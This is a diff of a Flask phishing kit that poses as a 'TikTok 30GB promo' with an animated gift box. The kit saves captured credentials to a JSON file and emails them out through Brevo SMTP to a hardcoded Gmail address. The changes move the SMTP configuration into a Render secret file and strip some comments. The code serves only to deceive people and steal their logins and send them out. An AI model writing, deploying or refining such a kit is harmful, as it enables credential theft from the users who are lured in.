@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – RENDER DEPLOYMENT
-# Brevo SMTP Configured | No Ngrok | Modern UI/UX
+# Brevo SMTP via Render Secret File | No Ngrok | Modern UI/UX
 # =============================================================================
 
 import os
@@ -10,18 +10,48 @@ import smtplib
 import threading
 from email.message import EmailMessage
 from datetime import datetime
+from pathlib import Path
 from flask import Flask, request, render_template_string
 
 # -------------------- Configuration --------------------
 DATA_FILE = "captured_credentials.json"
 
-# SMTP Settings (Brevo recommended, fully customizable)
-SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp-relay.brevo.com')
-SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))
-SMTP_USE_SSL = os.environ.get('SMTP_USE_SSL', 'false').lower() == 'true'
-EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
-EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
-EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')
+# Default SMTP settings (Brevo)
+SMTP_SERVER = "smtp-relay.brevo.com"
+SMTP_PORT = 587
+SMTP_USE_SSL = False
+EMAIL_SENDER = ""
+EMAIL_PASSWORD = ""
+EMAIL_RECEIVER = "ah3418678@gmail.com"
+
+# Load from Render Secret File if it exists (recommended for production)
+SECRET_FILE = "/etc/secrets/brevo.env"
+if Path(SECRET_FILE).exists():
+    with open(SECRET_FILE, 'r') as f:
+        for line in f:
+            line = line.strip()
+            if line and not line.startswith('#') and '=' in line:
+                key, value = line.split('=', 1)
+                if key == "SMTP_SERVER":
+                    SMTP_SERVER = value
+                elif key == "SMTP_PORT":
+                    SMTP_PORT = int(value)
+                elif key == "SMTP_USE_SSL":
+                    SMTP_USE_SSL = value.lower() == "true"
+                elif key == "EMAIL_SENDER":
+                    EMAIL_SENDER = value
+                elif key == "EMAIL_PASSWORD":
+                    EMAIL_PASSWORD = value
+                elif key == "EMAIL_RECEIVER":
+                    EMAIL_RECEIVER = value
+else:
+    # Fallback to environment variables (for local testing)
+    SMTP_SERVER = os.environ.get('SMTP_SERVER', SMTP_SERVER)
+    SMTP_PORT = int(os.environ.get('SMTP_PORT', SMTP_PORT))
+    SMTP_USE_SSL = os.environ.get('SMTP_USE_SSL', 'false').lower() == 'true'
+    EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
+    EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
+    EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', EMAIL_RECEIVER)
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -159,7 +189,6 @@ PROMO_HTML = '''
             box-shadow: 0 4px 0 #00b4b0;
             z-index: 5;
         }
-        /* Open animation */
         .gift-box.open .gift-lid {
             transform: translateY(-120px) rotate(-25deg);
             opacity: 0;
@@ -306,12 +335,9 @@ PROMO_HTML = '''
                 hint.style.opacity = '0';
                 setTimeout(() => { hint.style.display = 'none'; }, 500);
                 isOpen = true;
-                // Add subtle vibration haptic if supported
                 if (navigator.vibrate) navigator.vibrate(20);
             }
         });
-        
-        // Pre-open on hover? No, only click.
     </script>
 </body>
 </html>
